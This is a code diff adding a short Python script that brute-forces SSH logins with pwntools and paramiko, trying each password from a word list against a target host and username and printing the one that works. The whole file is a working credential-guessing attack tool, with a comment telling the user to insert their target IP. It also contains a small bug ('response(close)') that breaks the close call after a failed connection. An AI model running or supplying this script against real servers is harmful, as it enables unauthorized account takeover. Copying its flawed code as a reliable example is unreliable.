@@ -1,0 +1,21 @@
+from pwn import *
+import paramiko
+
+target="127.0.0.1" ##REPLACE THIS IP WITH YOUR TARGET IP
+username="USERNAME" 
+attempts = 0
+
+with open("randompasswords.txt","r") as passwordList:
+	for password in passwordList:
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting password : '{}'".format(attempts,password))
+			response = ssh(host=target, user=username, password=password, timeout=1)
+			if response.connected():
+				print("[BINGOOOO] We find it : {}".format(password))
+				response.close()
+				break
+			response(close)
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Sorry invalid password list , try another one")
+		attempts+=1
